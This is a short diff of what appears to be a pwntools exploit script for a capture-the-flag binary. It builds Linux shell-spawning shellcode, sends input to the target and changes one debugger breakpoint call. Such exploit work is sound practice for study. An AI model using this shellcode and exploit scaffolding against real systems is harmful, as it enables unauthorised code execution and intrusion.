@@ -25,7 +25,7 @@ shellcode = asm(shellcraft.amd64.linux.sh())
 
 
 def pwn(io):
-    ddebug("break *0x04012EB\n continue")
+    ddebug(io, "break *0x04012EB\n continue")
     payload = b""
     log.success(len(shellcode))
     io.sendlineafter("your home:\n", "16")
